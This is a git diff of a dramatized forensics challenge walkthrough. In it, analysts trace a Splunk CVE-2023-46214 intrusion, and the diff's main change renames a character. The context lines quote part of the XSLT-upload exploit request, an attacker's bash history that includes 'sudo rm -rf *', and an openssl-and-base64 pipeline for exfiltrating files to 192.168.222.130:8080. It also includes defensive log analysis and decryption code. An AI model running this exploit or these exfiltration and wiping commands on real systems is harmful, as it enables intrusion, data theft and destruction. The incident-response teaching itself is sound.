@@ -91,11 +91,11 @@ _The team exchanges knowing looks. There's only one person who can unravel this 
 
 ---
 
-### Scene 8: Enter **Mona**
+### Scene 8: Enter **Monaquimbamba**
 
 _The SOC room door hisses open. A figure stands in the doorway, silhouetted against the hallway lights. Her custom-built laptop glows with a soft, dangerous light._
 
-**Mona** [stepping into the light]:  
+**Monaquimbamba** [stepping into the light]:  
 "Show me what you've got. And someone better have decent coffee."
 
 _Her fingers hover over her keyboard like a pianist about to begin a symphony of code._
@@ -108,7 +108,7 @@ _Her fingers hover over her keyboard like a pianist about to begin a symphony of
 
 ### Scene 1: The Analysis Begins
 
-_The SOC room has transformed into Mona's temporary command center. Multiple monitors surround her, each reflecting the blue glow of packet analysis tools._
+_The SOC room has transformed into Monaquimbamba's temporary command center. Multiple monitors surround her, each reflecting the blue glow of packet analysis tools._
 
 ```
 [Network Capture Stats]
@@ -121,9 +121,9 @@ Capture Size: 2.3 MB
 
 ### Scene 2: The Hunt
 
-_Mona's fingers dance across her mechanical keyboard, the clicking sounds rhythmic and purposeful._
+_Monaquimbamba's fingers dance across her mechanical keyboard, the clicking sounds rhythmic and purposeful._
 
-**Mona** [muttering to herself]:  
+**Monaquimbamba** [muttering to herself]:  
 "Let's see what stories these packets can tell..."
 
 _She types her first filter command:_
@@ -141,34 +141,36 @@ _The screen refreshes, packets reorganizing themselves like digital playing card
 **John** [watching over her shoulder]:  
 "Thirty packets... out of more than fourteen hundred?"
 
-**Mona**:  
+**Monaquimbamba**:  
 "Sometimes the smallest anomalies tell the biggest stories."
 
 ---
 
 ### Scene 4: The Splunk Connection
 
-_Mona leans forward, her eyes narrowing at a particular sequence of packets._
+_Monaquimbamba leans forward, her eyes narrowing at a particular sequence of packets._
 
-**Mona** [to herself]:  
+**Monaquimbamba** [to herself]:  
 "The Splunk web UI connection... something's not right here."
 
 ---
 
 ### Scene 5: The Pattern
 
-_Multiple screens show different aspects of the same traffic pattern. Mona's face is illuminated by the data scrolling past._
+_Multiple screens show different aspects of the same traffic pattern. Monaquimbamba's face is illuminated by the data scrolling past._
 
 **Marcos**:  
 "What are you seeing?"
 
-**Mona** [highlighting sections of the capture]:  
+**Monaquimbamba** [highlighting sections of the capture]:  
 "These request patterns... they're identical to..."
 _Her voice trails off as she furiously types._
 
 ---
 
 ### Scene 6: The Revelation
+
+_The room falls silent as the implications sink in._
 
 ```
 POST /en-US/splunkd/__upload/indexing/preview?output_mode=json&props.NO_BINARY_CHECK=1&input.path=search.xsl HTTP/1.1
@@ -197,9 +199,7 @@ Content-Type: application/xslt+xml
 </xsl:stylesheet>
 ```
 
-_The room falls silent as the implications sink in._
-
-**Mona** [grimly]:  
+**Monaquimbamba** [grimly]:  
 "This exploit allows attackers to execute arbitrary commands through the Splunk web interface. Someone knew exactly what they were doing."
 
 **Thomas** [pointing at the screen]:  
@@ -209,7 +209,7 @@ _The room falls silent as the implications sink in._
 
 ### Scene 7: The Evidence
 
-_Mona pulls up multiple windows, creating a timeline of the attack:_
+_Monaquimbamba pulls up multiple windows, creating a timeline of the attack:_
 
 #### Step 1: Login
 
@@ -310,26 +310,26 @@ This vulnerability has the relevant MITRE ATT&CK Techniques for Maintaining Pers
 
 ### Scene 8: The Confirmation
 
-_Mona swivels in her chair to face the team._
+_Monaquimbamba swivels in her chair to face the team._
 
-**Mona**:  
+**Monaquimbamba**:  
 "We're dealing with someone who knows their CVEs. They exploited a vulnerability that was just published [Uptycs Blog](https://www.uptycs.com/blog/threat-research-report-team/splunk-vulnerability-cve-2023-46214). But they made one mistake..."
 
 _She turns back to her screen, a slight smile playing at the corner of her mouth._
 
-**Mona**:  
+**Monaquimbamba**:  
 "They left breadcrumbs."
 
 ---
 
 ### Scene 9: The Next Step
 
-_The team clusters around Mona's workspace, the tension palpable._
+_The team clusters around Monaquimbamba's workspace, the tension palpable._
 
 **Marcos**:  
 "What do we do now?"
 
-**Mona** [reaching for her custom USB drive]:  
+**Monaquimbamba** [reaching for her custom USB drive]:  
 "Now? We follow the trail. And I know exactly where it leads..."
 
 ---
@@ -340,22 +340,22 @@ _The team clusters around Mona's workspace, the tension palpable._
 
 _The investigation room is quiet except for the soft hum of servers. Multiple screens display log files and system timestamps._
 
-**Mona** [scrolling through logs]:  
+**Monaquimbamba** [scrolling through logs]:  
 "Something's not adding up here..."
 
 **Thomas**:  
 "What do you see?"
 
-**Mona**:  
+**Monaquimbamba**:  
 "The timestamps... they're dancing between two different time zones."
 
 ---
 
 ### Scene 2: The Discovery
 
-_Mona pulls up the root/var/log/syslog entries on the main screen, the text reflecting off her glasses._
+_Monaquimbamba pulls up the root/var/log/syslog entries on the main screen, the text reflecting off her glasses._
 
-**Mona**:  
+**Monaquimbamba**:  
 "Look at this. The system was originally in Pacific time..."
 
 _She highlights a log entry:_
@@ -367,7 +367,7 @@ Apr 13 23:21:30 ubuntu gnome-shell[4904]: GNOME Shell started at Sat Apr 13 2024
 **John** [shifting uncomfortably]:  
 "I had to adjust the timezone for better synchronization with the target systems."
 
-**Mona**: "What about this one"
+**Monaquimbamba**: "What about this one"
 
 ```bash
 grep -i "timezone" var/log/syslog
@@ -388,7 +388,7 @@ _The team examines a complex timeline of events displayed across multiple monito
 **Marcos**:  
 "Ho Chi Minh City timezone... UTC+7. That's a fourteen-hour swing from PDT."
 
-**Mona**:  
+**Monaquimbamba**:  
 "And that's exactly what they were counting on. The time disparity created the perfect smoke screen."
 
 ---
@@ -397,13 +397,13 @@ _The team examines a complex timeline of events displayed across multiple monito
 
 _A visualization appears showing two parallel timelines - one in PDT, one in Asia/Ho_Chi_Minh._
 
-**Mona**:  
+**Monaquimbamba**:  
 "They didn't just exploit our systems... they exploited time itself."
 
 **Marcos**:  
 "By operating in the gaps between timezone updates..."
 
-**Mona** [finishing his thought]:  
+**Monaquimbamba** [finishing his thought]:  
 "They created their own temporal blind spots. Brilliant and devastating."
 
 ---
@@ -412,21 +412,21 @@ _A visualization appears showing two parallel timelines - one in PDT, one in Asi
 
 _The room glows with the light of dozens of screens, each showing different aspects of the investigation._
 
-**Mona**:  
+**Monaquimbamba**:  
 "They thought they could hide in the gaps between seconds, between timezones..."
 
 _She activates her tracking algorithm._
 
-**Mona** [with a slight smile]:  
+**Monaquimbamba** [with a slight smile]:  
 "But time... time always tells the truth."
 
 ## Episode 5: The Trail of Breadcrumbs
 
 ### Scene 1: The Log Analysis
 
-_Mona's workspace is filled with terminal windows displaying /var/log/auth.log entries. The soft glow of the screens illuminates her focused expression._
+_Monaquimbamba's workspace is filled with terminal windows displaying /var/log/auth.log entries. The soft glow of the screens illuminates her focused expression._
 
-**Mona** [scanning through logs]:  
+**Monaquimbamba** [scanning through logs]:  
 "Three minutes. They were in and out in just three minutes."
 
 _She highlights a timestamp sequence:_
@@ -482,9 +482,9 @@ Apr 14 08:03:08 ubuntu systemd-logind[673]: Removed session 7.
 
 ### Scene 2: The Pattern
 
-_Multiple screens show the attacker's activities timeline. Mona pieces together the sequence._
+_Multiple screens show the attacker's activities timeline. Monaquimbamba pieces together the sequence._
 
-**Mona**:  
+**Monaquimbamba**:  
 "Watch how they moved..."
 
 _She brings up key log entries:_
@@ -547,7 +547,7 @@ Below is a breakdown of key log entries to understand the attacker’s actions:
 **Marcos**:  
 "They knew exactly what they were after."
 
-**Mona**: "we can trace when the attacker connected via SSH. To do this, we examine log entries related to the `sshd` service"
+**Monaquimbamba**: "we can trace when the attacker connected via SSH. To do this, we examine log entries related to the `sshd` service"
 
 ```bash
 cat auth.log | grep -i "sshd"
@@ -577,9 +577,9 @@ Knowing the timezone, we can convert connection timestamps to UTC.
 
 ### Scene 3: The Command History
 
-_Mona opens a new terminal window, displaying the contents of `.bash_history` file located in `/var/www/`_
+_Monaquimbamba opens a new terminal window, displaying the contents of `.bash_history` file located in `/var/www/`_
 
-**Mona**:  
+**Monaquimbamba**:  
 "Found their footprints."
 
 _She projects the command history:_
@@ -599,7 +599,7 @@ sudo rm -rf *
 **Thomas**:  
 "Classic reconnaissance pattern."
 
-**Mona** [eyes widening]:  
+**Monaquimbamba** [eyes widening]:  
 "This is beautiful... in a terrifying way."
 
 _She breaks down the command:_
@@ -613,13 +613,13 @@ sudo openssl enc -aes-256-cbc \
 **John**:  
 "They're using system properties to generate their keys?"
 
-**Mona**:  
+**Monaquimbamba**:  
 "The kernel version for the IV... system time for the key..."
 
 **Marcos** [pointing]:  
 "Look at their movement pattern..."
 
-**Mona**:  
+**Monaquimbamba**:  
 "They went straight for johnnycage's documents. Just like we saw in the logs."
 
 **John**:  
@@ -644,19 +644,19 @@ iv 4fa17640b7dfe8799f072c65b15f581d
 
 _A network diagram appears, showing the data's path._
 
-**Mona**:  
+**Monaquimbamba**:  
 "The final destination: 192.168.222.130, port 8080."
 
 **Thomas**:  
 "And they encoded it three times - encryption, base64, and EBCDIC."
 
-**Mona**:  
+**Monaquimbamba**:  
 "Like nesting dolls of obfuscation."
 
 **Marcos**:  
 "A perfectly choreographed attack."
 
-**Mona**: "Let put this all together"
+**Monaquimbamba**: "Let put this all together"
 
 The following command line demonstrates a multi-step operation using several tools—`openssl`, `cut`, `uname`, `md5sum`, `sha256sum`, `date`, `base64`, and `dd`. Here’s a detailed breakdown:
 
@@ -702,9 +702,9 @@ sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 <<< $(uname -r | md5sum)) -K $(c
 
 ### Scene 6: The IP Address
 
-_Mona zooms in on the connection details._
+_Monaquimbamba zooms in on the connection details._
 
-**Mona**:  
+**Monaquimbamba**:  
 "192.168.222.130 - Our ghost has an address."
 
 _She brings up the SSH connection log:_
@@ -727,10 +727,10 @@ _Thomas pulls up network traffic logs._
 **Thomas**:  
 "Got the EBCDIC-encoded transmission. Port 8080, just like in the command."
 
-**Mona**:  
+**Monaquimbamba**:  
 "Now we reverse their Russian doll encryption..."
 
-**Mona**:  
+**Monaquimbamba**:  
 "This Python script is designed to extract raw TCP data from a pcap file, convert it from EBCDIC to ASCII, decode it from Base64, and decrypt it using OpenSSL."
 
 #### Step 1: Extracting Raw TCP Data
@@ -823,7 +823,7 @@ def decrypt_data():
 
 _The team has set up a specialized workstation for data recovery. Multiple servers hum in the background._
 
-**Mona**:  
+**Monaquimbamba**:  
 "We have both pieces of the puzzle now."
 
 _She displays the known parameters:_
@@ -837,9 +837,9 @@ Key: 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d
 
 ### Scene 3: The Decryption Process
 
-_Mona's fingers fly across the keyboard as she runs the reverse process._
+_Monaquimbamba's fingers fly across the keyboard as she runs the reverse process._
 
-**Mona**:  
+**Monaquimbamba**:  
 "First, convert from EBCDIC back to ASCII then decode to Base64 and we will have a .zip"
 
 _She types commands:_
@@ -854,7 +854,7 @@ openssl enc -d -aes-256-cbc -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a0
 Successfully decrypted to decrypted.zip
 ```
 
-**Mona**:  
+**Monaquimbamba**:  
 "Now we can unzip `decrypted.zip` to obtain the exfiltrated file."
 
 ```
@@ -872,16 +872,16 @@ _A file browser window opens, showing the contents of the recovered zip file._
 **Marcos**:  
 "Important.pdf... we got it back."
 
-**Mona** [examining the file]:  
+**Monaquimbamba** [examining the file]:  
 "But why this file? What made it so... important?"
 
 ---
 
 ### Scene 6: The Hidden Message
 
-_Mona opens a hex editor, examining the PDF's metadata._
+_Monaquimbamba opens a hex editor, examining the PDF's metadata._
 
-**Mona**:  
+**Monaquimbamba**:  
 "Wait... there's something embedded in the PDF structure..."
 
 _Her screen fills with hexadecimal values._
@@ -889,13 +889,13 @@ _Her screen fills with hexadecimal values._
 **John**:  
 "What is it?"
 
-**Mona** [leaning closer]:  
+**Monaquimbamba** [leaning closer]:  
 "A message... and coordinates?"
 
 **Marcos**:  
 "Can we open it ?"
 
-**Mona**:  
+**Monaquimbamba**:  
 "Let's see"
 
 **John**:  
